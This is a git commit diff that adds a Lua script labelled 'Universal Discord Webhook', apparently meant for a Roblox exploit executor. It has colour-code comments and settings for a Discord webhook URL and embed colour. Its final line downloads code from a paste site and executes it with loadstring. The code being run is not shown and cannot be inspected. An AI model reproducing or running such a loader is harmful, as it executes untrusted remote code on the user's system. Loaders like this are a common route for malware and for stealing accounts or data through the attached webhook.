8e8c5aa5af2e24ccfcaecffd84e0ba648363f809
Emil Toth <emiltoth1870@gmail.com>
2023-03-08 18:28:33 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Universal Discord Webhook.lua
@@ -0,0 +1,18 @@
+--[[
+
+     ~~//  Color Code (HEX)  \\~~
+  RED = f54747     GREEN = 78ff78
+  BLUE = 4c6cfc     PURPLE = b36bff
+  YELLOW = fff27a     PINK = ffa3e2
+
+
+ -- Don't Remove the "0x" on "getgenv().embedcolor" or it will not work!--
+
+--]]
+
+getgenv().DiscordWebhook = "" -- Discord Webhook Here
+getgenv().embedcolor = "0xf54747" -- Embed Body Color (On left Side of the Embed, You can get HEX Code above â) 
+
+--made it into opensourced so people can steal it
+
+loadstring(game:HttpGet("https://pst.klgrth.io/paste/e3d52/raw"))()
